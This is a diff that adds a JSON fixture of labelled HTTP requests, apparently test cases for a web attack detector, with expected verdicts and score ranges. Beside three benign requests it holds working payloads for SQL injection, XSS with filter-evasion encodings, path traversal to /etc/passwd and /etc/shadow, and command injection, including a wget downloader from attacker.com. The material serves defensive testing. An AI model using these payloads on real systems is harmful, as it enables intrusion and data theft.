@@ -1,0 +1,182 @@
+[
+  {
+    "id": "BENIGN-001",
+    "category": "benign_web",
+    "input": "GET /assets/logo.png HTTP/1.1\nHost: target-portfolio.local\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "expected_status": "BENIGN",
+    "expected_attack_type": "NONE",
+    "expected_score_min": 0.0,
+    "expected_score_max": 0.12,
+    "notes": "Static asset request normal."
+  },
+  {
+    "id": "BENIGN-002",
+    "category": "benign_graphql",
+    "input": "POST /graphql HTTP/1.1\nHost: target-portfolio.local\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0\nAuthorization: Bearer dummy_jwt_signature\nContent-Type: application/json\n\n{\"query\":\"query GetProfile($id: ID!) { user(id: $id) { name email } }\",\"variables\":{\"id\":\"usr_1001\"}}",
+    "expected_status": "BENIGN",
+    "expected_attack_type": "NONE",
+    "expected_score_min": 0.0,
+    "expected_score_max": 0.12,
+    "notes": "Authenticated GraphQL query normal."
+  },
+  {
+    "id": "BENIGN-003",
+    "category": "benign_checkout",
+    "input": "POST /api/checkout HTTP/1.1\nHost: target-portfolio.local\nContent-Type: application/json\n\n{\"transaction\":{\"id\":\"tx_900100\",\"amount\":1499000,\"currency\":\"IDR\",\"items\":[{\"name\":\"Nexus Cyber License\",\"quantity\":1,\"price\":1499000}]},\"customer\":{\"name\":\"Andi Pratama\",\"address\":\"Jakarta\"}}",
+    "expected_status": "BENIGN",
+    "expected_attack_type": "NONE",
+    "expected_score_min": 0.0,
+    "expected_score_max": 0.15,
+    "notes": "Structured checkout payload should not be over-classified."
+  },
+  {
+    "id": "SQLI-001",
+    "category": "sql_injection",
+    "input": "POST /api/login HTTP/1.1\nHost: target.local\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin' OR '1'='1&password=anything",
+    "expected_status": "MALICIOUS",
+    "expected_attack_type": "SQL_INJECTION",
+    "expected_score_min": 0.9,
+    "expected_score_max": 1.0,
+    "notes": "Classic tautology auth bypass."
+  },
+  {
+    "id": "SQLI-002",
+    "category": "sql_injection",
+    "input": "GET /products?id=10 UNION SELECT 1,username,password FROM users-- HTTP/1.1\nHost: target.local",
+    "expected_status": "MALICIOUS",
+    "expected_attack_type": "SQL_INJECTION",
+    "expected_score_min": 0.9,
+    "expected_score_max": 1.0,
+    "notes": "Union-based data extraction."
+  },
+  {
+    "id": "SQLI-003",
+    "category": "sql_injection",
+    "input": "POST /api/login HTTP/1.1\nHost: target.local\nContent-Type: application/x-www-form-urlencoded\n\nusername=1%253B%2520DROP%2520TABLE%2520logs%253B--&password=safe",
+    "expected_status": "MALICIOUS",
+    "expected_attack_type": "SQL_INJECTION",
+    "expected_score_min": 0.92,
+    "expected_score_max": 1.0,
+    "notes": "Encoded stacked query bypass variant."
+  },
+  {
+    "id": "XSS-001",
+    "category": "cross_site_scripting",
+    "input": "GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1\nHost: target.local\nUser-Agent: Mozilla/5.0",
+    "expected_status": "MALICIOUS",
+    "expected_attack_type": "CROSS_SITE_SCRIPTING",
+    "expected_score_min": 0.88,
+    "expected_score_max": 1.0,
+    "notes": "Direct reflected XSS."
+  },
+  {
+    "id": "XSS-002",
+    "category": "cross_site_scripting",
+    "input": "GET /search?q=<body onload=prompt(1)> HTTP/1.1\nHost: target.local\nUser-Agent: Mozilla/5.0",
+    "expected_status": "MALICIOUS",
+    "expected_attack_type": "CROSS_SITE_SCRIPTING",
+    "expected_score_min": 0.88,
+    "expected_score_max": 1.0,
+    "notes": "Event-handler XSS payload."
+  },
+  {
+    "id": "XSS-003",
+    "category": "cross_site_scripting",
+    "input": "GET /search?q=0x6a6176617363726970743a616c657274283129 HTTP/1.1\nHost: target.local\nUser-Agent: Mozilla/5.0",
+    "expected_status": "MALICIOUS",
+    "expected_attack_type": "CROSS_SITE_SCRIPTING",
+    "expected_score_min": 0.9,
+    "expected_score_max": 1.0,
+    "notes": "Hex-encoded javascript URI intended to bypass filters."
+  },
+  {
+    "id": "PATH-001",
+    "category": "path_traversal",
+    "input": "GET /api/download?file=../../../../etc/passwd HTTP/1.1\nHost: target.local",
+    "expected_status": "MALICIOUS",
+    "expected_attack_type": "PATH_TRAVERSAL",
+    "expected_score_min": 0.9,
+    "expected_score_max": 1.0,
+    "notes": "Classic traversal payload."
+  },
+  {
+    "id": "PATH-002",
+    "category": "path_traversal",
+    "input": "GET /api/download?file=/var/www/html/../../../../etc/shadow HTTP/1.1\nHost: target.local",
+    "expected_status": "MALICIOUS",
+    "expected_attack_type": "PATH_TRAVERSAL",
+    "expected_score_min": 0.9,
+    "expected_score_max": 1.0,
+    "notes": "Absolute path plus traversal to shadow file."
+  },
+  {
+    "id": "PATH-003",
+    "category": "path_traversal",
+    "input": "GET /api/download?file=%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd HTTP/1.1\nHost: target.local",
+    "expected_status": "MALICIOUS",
+    "expected_attack_type": "PATH_TRAVERSAL",
+    "expected_score_min": 0.92,
+    "expected_score_max": 1.0,
+    "notes": "Double-encoded traversal variant."
+  },
+  {
+    "id": "CMD-001",
+    "category": "command_injection",
+    "input": "POST /api/ping HTTP/1.1\nHost: target.local\nContent-Type: application/json\n\n{\"ip\":\"127.0.0.1; cat /etc/passwd\"}",
+    "expected_status": "MALICIOUS",
+    "expected_attack_type": "COMMAND_INJECTION",
+    "expected_score_min": 0.94,
+    "expected_score_max": 1.0,
+    "notes": "Shell separator plus file disclosure."
+  },
+  {
+    "id": "CMD-002",
+    "category": "command_injection",
+    "input": "POST /api/ping HTTP/1.1\nHost: target.local\nContent-Type: application/json\n\n{\"ip\":\"127.0.0.1 && wget http://attacker.com/shell.sh\"}",
+    "expected_status": "MALICIOUS",
+    "expected_attack_type": "COMMAND_INJECTION",
+    "expected_score_min": 0.94,
+    "expected_score_max": 1.0,
+    "notes": "AND operator plus downloader."
+  },
+  {
+    "id": "CMD-003",
+    "category": "command_injection",
+    "input": "POST /api/ping HTTP/1.1\nHost: target.local\nContent-Type: application/json\n\n{\"ip\":\"127.0.0.1 | whoami\"}",
+    "expected_status": "MALICIOUS",
+    "expected_attack_type": "COMMAND_INJECTION",
+    "expected_score_min": 0.9,
+    "expected_score_max": 1.0,
+    "notes": "Pipe operator command injection."
+  },
+  {
+    "id": "ZDAY-001",
+    "category": "zero_day_bypass",
+    "input": "POST /api/gateway-processor HTTP/1.1\nHost: critical-core.nexus.local\nContent-Type: text/plain\n\n<math><mi//href=\"javascript:alert(1)\">CLICK",
+    "expected_status": "MALICIOUS",
+    "expected_attack_type": "ZERO_DAY_BYPASS",
+    "expected_score_min": 0.95,
+    "expected_score_max": 1.0,
+    "notes": "MathML parser confusion bypass."
+  },
+  {
+    "id": "ZDAY-002",
+    "category": "zero_day_bypass",
+    "input": "GET /products?id=%2527%2520OR%25201%253D1 HTTP/1.1\nHost: target.local",
+    "expected_status": "MALICIOUS",
+    "expected_attack_type": "ZERO_DAY_BYPASS",
+    "expected_score_min": 0.9,
+    "expected_score_max": 1.0,
+    "notes": "Double URL encoding bypass variant."
+  },
+  {
+    "id": "ZDAY-003",
+    "category": "zero_day_bypass",
+    "input": "GET /search?q=<InpUT/**/AuTofoCuS/**/OnfoCuS=aLERT(1)> HTTP/1.1\nHost: target.local\nUser-Agent: Mozilla/5.0",
+    "expected_status": "MALICIOUS",
+    "expected_attack_type": "ZERO_DAY_BYPASS",
+    "expected_score_min": 0.92,
+    "expected_score_max": 1.0,
+    "notes": "Obfuscated mixed-case payload intended to bypass pattern filters."
+  }
+]
